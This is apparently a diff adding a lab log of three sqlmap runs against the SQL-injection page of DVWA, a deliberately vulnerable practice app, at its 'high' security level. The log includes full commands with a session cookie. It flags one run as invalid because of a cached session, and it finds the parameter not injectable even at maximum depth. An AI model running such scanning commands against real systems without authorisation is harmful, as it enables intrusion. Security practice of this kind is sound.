@@ -1,0 +1,57 @@
+Pass 1 -- same URL, default sqlmap settings, SESSION CACHE REUSED (invalid test)
+----------------------------------------------------------------------------
+$ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=cg4occ5ghssjddocj64ggoff24; security=high" \
+  --batch --dbs | tee high.txt
+
+[02:00:34] [INFO] resuming back-end DBMS 'mysql'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind / error-based / time-based blind / UNION query
+    (identical payloads to the Low/Medium run)
+---
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+This result is INVALID as a test of High: sqlmap reused its cached injection
+point from the earlier Low/Medium runs against the same URL instead of
+re-testing. Discovered because the output said "resuming ... from stored
+session" rather than running any fresh tests.
+
+Pass 2 -- same URL, --flush-session forces a fresh test (VALID)
+----------------------------------------------------------------------------
+$ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=cg4occ5ghssjddocj64ggoff24; security=high" \
+  --flush-session --batch --dbs | tee high.txt
+
+[02:01:07] [INFO] flushing session file
+[02:01:07] [WARNING] GET parameter 'id' does not appear to be dynamic
+[02:01:07] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be SQL injectable
+(tests every default boolean-based, error-based, stacked-query, time-based,
+and UNION technique at --level 1 --risk 1)
+[02:01:08] [WARNING] GET parameter 'id' does not seem to be injectable
+[02:01:08] [WARNING] GET parameter 'Submit' does not seem to be injectable
+[02:01:08] [CRITICAL] all tested parameters do not appear to be injectable.
+Try to increase values for '--level'/'--risk' options if you wish to perform
+more tests.
+
+Pass 3 -- same URL, maximum depth
+----------------------------------------------------------------------------
+$ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=cg4occ5ghssjddocj64ggoff24; security=high" \
+  --level=5 --risk=3 --batch --dbs | tee -a high.txt
+
+(tests several hundred payload variations across every supported DBMS and
+every injection technique, plus header-based injection on 'Host')
+[02:05:48] [WARNING] parameter 'Host' does not seem to be injectable
+[02:05:48] [CRITICAL] all tested parameters do not appear to be injectable.
+If you suspect that there is some kind of protection mechanism involved
+(e.g. WAF) maybe you could try to use option '--tamper' ... and/or switch
+'--random-agent'
+[02:05:48] [WARNING] HTTP error codes detected during run:
+400 (Bad Request) - 10775 times
+
+Result: not injectable via the id/Submit GET parameters, at maximum sqlmap
+depth. Every rejected payload produced an HTTP 400.
